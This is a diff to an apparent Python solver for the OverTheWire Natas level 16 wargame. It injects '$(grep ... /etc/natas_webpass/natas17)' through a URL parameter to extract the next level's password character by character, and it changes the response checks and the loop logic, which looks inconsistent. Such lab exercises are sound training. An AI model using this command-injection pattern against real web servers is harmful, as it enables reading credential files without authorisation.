@@ -25,9 +25,10 @@ def get_natas_17_password():
         # print(response.status_code)
         # print(response.request)
         # print(response.text)
-        if "Englishing" in response.text:
+        if "Englishing" not in response.text:
             dictionary.append(char)
     print(dictionary)
+
     password = []
     while len(password) < 32:
         for char in dictionary:
@@ -36,11 +37,11 @@ def get_natas_17_password():
                 response = get("http://natas16.natas.labs.overthewire.org/?needle=Englishing$(grep ^"+"".join(password)+" /etc/natas_webpass/natas17)", auth=auth)
             except RequestException:
                 print("exception thrown")
-            if "Englishing" not in response.text:
+            if "Englishing" in response.text:
                 password.pop()
-                break
-            print("".join(password))
-    print("".join(password))
+            else:
+                print("".join(password))
+    # print("".join(password))
             
 
 if __name__ == "__main__":
